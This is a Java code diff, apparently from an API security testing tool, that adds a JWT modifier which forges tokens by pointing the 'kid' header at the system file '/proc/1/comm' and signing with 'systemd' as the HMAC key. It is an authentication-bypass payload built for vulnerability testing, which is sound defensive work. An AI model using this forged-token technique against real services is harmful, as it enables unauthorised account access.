@@ -2,13 +2,16 @@ package com.akto.util.modifier;
 
 import com.akto.dao.context.Context;
 import com.akto.dto.type.KeyTypes;
+import com.auth0.jwt.JWT;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.google.gson.Gson;
 import com.mongodb.BasicDBObject;
+import com.nimbusds.jose.Algorithm;
 import com.nimbusds.jose.jwk.JWK;
 import com.nimbusds.jose.jwk.KeyUse;
 
 import io.jsonwebtoken.Jwts;
+import io.jsonwebtoken.SignatureAlgorithm;
 
 import java.nio.charset.StandardCharsets;
 import java.security.Key;
@@ -124,6 +127,38 @@ public abstract class JwtModifier extends PayloadModifier {
                 .setPayload(mapper.writeValueAsString(bodyJson))
                 .signWith(privateKey)
                 .compact();
+
+    }
+
+    public static String addKidParamHeader(String jwt) throws Exception {
+
+        Map<String, String> extraHeaders = new HashMap<>();
+        extraHeaders.put("kid", "/proc/1/comm");
+        Map<String, Object> manipulatedJwtHeader = manipulateJWTHeaderToMap(jwt, extraHeaders);
+
+        Map<String, Object> bodyJson = extractBodyFromJWT(jwt);
+
+        for (String key: bodyJson.keySet()) {
+            Object value = bodyJson.get(key);
+            if (value == null) {
+                bodyJson.remove(key);
+            }
+            if (value instanceof Map) {
+                Map<String, Object> valMap = (Map<String, Object>) value;
+                for (String valKey: valMap.keySet()) {
+                    if (valMap.get(valKey) == null) {
+                        valMap.remove(valKey);
+                    }
+                }
+            }
+        }
+
+        com.auth0.jwt.algorithms.Algorithm algorithm = com.auth0.jwt.algorithms.Algorithm.HMAC256("systemd");
+
+        return JWT.create()
+                .withHeader(manipulatedJwtHeader)
+                .withPayload(bodyJson)
+                .sign(algorithm);
 
     }
 
